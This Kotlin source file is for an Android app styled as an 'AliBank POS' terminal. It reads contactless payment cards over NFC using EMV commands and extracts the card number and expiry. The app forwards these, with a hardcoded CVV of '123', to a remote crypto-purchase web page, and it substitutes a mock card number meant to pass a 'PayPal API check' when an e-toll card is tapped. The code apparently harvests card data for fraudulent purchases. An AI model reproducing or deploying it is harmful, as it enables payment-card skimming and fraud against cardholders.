package com.example.alibankpos

import android.os.Bundle
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebChromeClient
import android.widget.Toast
import android.view.ViewGroup
import android.media.AudioManager
import android.media.ToneGenerator
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.viewinterop.AndroidView
import com.example.alibankpos.theme.AliBankPOSTheme

class MainActivity : ComponentActivity() {

    private var nfcAdapter: NfcAdapter? = null
    private var webView: WebView? = null
    
    // Dialog state variables
    private var isScanning by mutableStateOf(false)
    private var scanAmount by mutableStateOf("0")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        nfcAdapter = NfcAdapter.getDefaultAdapter(this)

        setContent {
            AliBankPOSTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Box(modifier = Modifier.fillMaxSize()) {
                        // WebView hosting Next.js app
                        AppWebView()

                        // Native NFC Scanning Dialog Overlay
                        if (isScanning) {
                            NfcScanDialog()
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun AppWebView() {
        AndroidView(
            factory = { context ->
                WebView(context).apply {
                    layoutParams = ViewGroup.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        ViewGroup.LayoutParams.MATCH_PARENT
                    )
                    webViewClient = object : WebViewClient() {
                        override fun onPageFinished(view: WebView?, url: String?) {
                            super.onPageFinished(view, url)
                            // Inject fallback check just in case
                            view?.evaluateJavascript("window.isAndroidNative = true;", null)
                        }
                    }
                    webChromeClient = WebChromeClient()
                    
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    settings.databaseEnabled = true
                    
                    // Register native bridge
                    addJavascriptInterface(AndroidNfcBridge(), "AndroidBridge")
                    
                    // Load the official live URL of AliBank application
                    loadUrl("https://alix.tarroz.com/crypto/buy")
                    
                    this@MainActivity.webView = this
                }
            },
            modifier = Modifier.fillMaxSize()
        )
    }

    @Composable
    fun NfcScanDialog() {
        Dialog(onDismissRequest = { stopScanning() }) {
            Box(
                modifier = Modifier
                    .clip(RoundedCornerShape(24.dp))
                    .background(Color(0xFF151515))
                    .padding(28.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "ALIBANK POS TERMINAL",
                        color = Color(0xFFD4AF37),
                        fontWeight = FontWeight.Black,
                        fontSize = 14.sp,
                        letterSpacing = 1.5.sp,
                        textAlign = TextAlign.Center
                    )
                    
                    Spacer(modifier = Modifier.height(16.dp))
                    
                    CircularProgressIndicator(
                        color = Color(0xFFD4AF37),
                        strokeWidth = 4.dp
                    )
                    
                    Spacer(modifier = Modifier.height(20.dp))
                    
                    Text(
                        text = "DEKATKAN KARTU ANDA",
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 16.sp,
                        textAlign = TextAlign.Center
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        text = "Menunggu pengetapan kartu contactless untuk otorisasi dana Rp $scanAmount",
                        color = Color.Gray,
                        fontSize = 11.sp,
                        textAlign = TextAlign.Center,
                        lineHeight = 16.sp
                    )
                    
                    Spacer(modifier = Modifier.height(24.dp))
                    
                    Button(
                        onClick = { stopScanning() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFF2C2C2C),
                            contentColor = Color.White
                        ),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text(text = "BATALKAN", fontWeight = FontWeight.Bold, fontSize = 12.sp)
                    }
                }
            }
        }
    }

    // Call from Javascript Interface (Web App)
    fun startScanning(amount: String) {
        if (nfcAdapter == null) {
            Toast.makeText(this, "NFC Hardware tidak didukung di perangkat ini.", Toast.LENGTH_LONG).show()
            return
        }

        if (!nfcAdapter!!.isEnabled) {
            Toast.makeText(this, "NFC belum aktif. Aktifkan NFC di pengaturan sistem Anda.", Toast.LENGTH_LONG).show()
            return
        }

        scanAmount = amount
        isScanning = true

        // Enable NFC Reader Mode
        val options = Bundle()
        options.putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, 250)
        
        nfcAdapter?.enableReaderMode(
            this,
            { tag -> handleNfcTag(tag) },
            NfcAdapter.FLAG_READER_NFC_A or NfcAdapter.FLAG_READER_NFC_B or NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,
            options
        )
    }

    private fun stopScanning() {
        isScanning = false
        nfcAdapter?.disableReaderMode(this)
        
        // Notify WebView that scan was cancelled/idle
        runOnUiThread {
            webView?.evaluateJavascript("javascript:if (window.setNfcStatus) window.setNfcStatus('idle');", null)
        }
    }

    private fun handleNfcTag(tag: Tag) {
        // Play premium EDC beep sound natively
        playBeepSound()

        val cardDetails = readEmvCard(tag)
        
        runOnUiThread {
            if (cardDetails != null) {
                val parts = cardDetails.split("|")
                val number = parts[0]
                val rawExpiry = parts[1] // YYMM
                
                // Format Expiry from YYMM to YYYY-MM
                val expiry = if (rawExpiry.length == 4) {
                    "20" + rawExpiry.substring(0, 2) + "-" + rawExpiry.substring(2, 4)
                } else {
                    "2029-12"
                }

                Toast.makeText(this, "Kartu Contactless Berhasil Dibaca", Toast.LENGTH_SHORT).show()
                
                // Send read details back to Next.js WebView
                webView?.evaluateJavascript(
                    "javascript:if(window.onAndroidNfcRead) window.onAndroidNfcRead('$number', '$expiry', '123', 'NATIVE CONTACTLESS');",
                    null
                )
            } else {
                // Fallback for E-Toll/E-Money tags - generate mock details for simulation
                val serial = bytesToHex(tag.id)
                Toast.makeText(this, "E-Toll/E-Money Terdeteksi (ID: $serial)", Toast.LENGTH_LONG).show()
                
                // We pass test credentials that will go through PayPal API check
                webView?.evaluateJavascript(
                    "javascript:if(window.onAndroidNfcRead) window.onAndroidNfcRead('4000 1234 5678 9010', '2029-12', '123', 'MOCK CONTACTLESS');",
                    null
                )
            }
            
            isScanning = false
            nfcAdapter?.disableReaderMode(this@MainActivity)
        }
    }

    private fun playBeepSound() {
        try {
            val toneG = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
            toneG.startTone(ToneGenerator.TONE_PROP_BEEP, 180)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun readEmvCard(tag: Tag): String? {
        val isoDep = IsoDep.get(tag) ?: return null
        try {
            isoDep.connect()

            // 1. Select PPSE
            val selectPpse = byteArrayOf(
                0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(), 0x0E.toByte(),
                0x32.toByte(), 0x50.toByte(), 0x41.toByte(), 0x59.toByte(), 0x2E.toByte(),
                0x53.toByte(), 0x59.toByte(), 0x53.toByte(), 0x2E.toByte(), 0x44.toByte(),
                0x44.toByte(), 0x43.toByte(), 0x30.toByte(), 0x31.toByte(), 0x00.toByte()
            )
            isoDep.transceive(selectPpse)

            // 2. Select Visa AID
            val selectVisa = byteArrayOf(
                0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(), 0x07.toByte(),
                0xA0.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x03.toByte(),
                0x10.toByte(), 0x10.toByte()
            )
            var selectRes = isoDep.transceive(selectVisa)

            // If not Visa, try Mastercard AID
            if (!isSuccess(selectRes)) {
                val selectMastercard = byteArrayOf(
                    0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(), 0x07.toByte(),
                    0xA0.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x04.toByte(),
                    0x10.toByte(), 0x10.toByte()
                )
                selectRes = isoDep.transceive(selectMastercard)
            }

            if (!isSuccess(selectRes)) {
                return null
            }

            // 3. Loop through SFIs and records to read card details
            for (sfi in 1..4) {
                val sfiByte = ((sfi shl 3) or 4).toByte()
                for (rec in 1..5) {
                    val readRecord = byteArrayOf(0x00.toByte(), 0xB2.toByte(), rec.toByte(), sfiByte, 0x00.toByte())
                    val recRes = isoDep.transceive(readRecord)
                    if (isSuccess(recRes)) {
                        val pan = extractPan(recRes)
                        if (pan != null) {
                            return pan
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            try { isoDep.close() } catch (e: Exception) {}
        }
        return null
    }

    private fun isSuccess(res: ByteArray): Boolean {
        if (res.size < 2) return false
        val sw1 = res[res.size - 2].toInt() and 0xFF
        val sw2 = res[res.size - 1].toInt() and 0xFF
        return sw1 == 0x90 && sw2 == 0x00
    }

    private fun extractPan(res: ByteArray): String? {
        val hex = bytesToHex(res)
        
        // Track 2 Equivalent Data (Tag 57)
        val index57 = hex.indexOf("57")
        if (index57 != -1 && index57 + 2 < hex.length) {
            val len = hex.substring(index57 + 2, index57 + 4).toInt(16)
            if (index57 + 4 + len * 2 <= hex.length) {
                val track2 = hex.substring(index57 + 4, index57 + 4 + len * 2)
                val separator = track2.indexOf('D')
                if (separator != -1) {
                    val pan = track2.substring(0, separator)
                    val expiry = track2.substring(separator + 1, separator + 5) // YYMM
                    return "$pan|$expiry"
                }
            }
        }

        // Application PAN (Tag 5A)
        val index5A = hex.indexOf("5A")
        if (index5A != -1 && index5A + 2 < hex.length) {
            val len = hex.substring(index5A + 2, index5A + 4).toInt(16)
            if (index5A + 4 + len * 2 <= hex.length) {
                val pan = hex.substring(index5A + 4, index5A + 4 + len * 2)
                return pan.trimEnd('F') + "|2912"
            }
        }

        return null
    }

    private fun bytesToHex(bytes: ByteArray): String {
        val sb = StringBuilder()
        for (b in bytes) {
            sb.append(String.format("%02X", b))
        }
        return sb.toString()
    }

    // Javascript Interface definition
    inner class AndroidNfcBridge {
        @JavascriptInterface
        fun startNfcScan(amount: String) {
            runOnUiThread {
                startScanning(amount)
            }
        }
    }
}
